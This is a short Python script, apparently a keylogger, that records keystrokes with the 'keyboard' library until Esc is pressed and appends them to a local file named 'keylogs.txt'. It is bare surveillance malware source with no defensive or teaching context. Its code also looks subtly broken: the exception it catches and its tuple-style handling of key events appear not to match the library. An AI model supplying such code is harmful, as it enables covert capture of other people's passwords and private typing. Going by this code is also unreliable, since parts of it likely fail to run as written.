import keyboard
import sys
import time

LOG_FILE = 'keylogs.txt'

def main():
    try:
        while True:
            events = keyboard.record(until='esc')
            write_to_file(events)
    except keyboard.KeyboardInterrupt:
        print('Exiting...')
        sys.exit()
    except Exception as e:
        print(f'Error: {e}')

def write_to_file(events):
    with open(LOG_FILE, 'a') as f:
        for event in events:
            if len(event) == 3 and event[2] != 'up':
                f.write(event[1])
            else:
                f.write(f'<{event[1]}>')
        f.write('\n')

if __name__ == '__main__':
    main()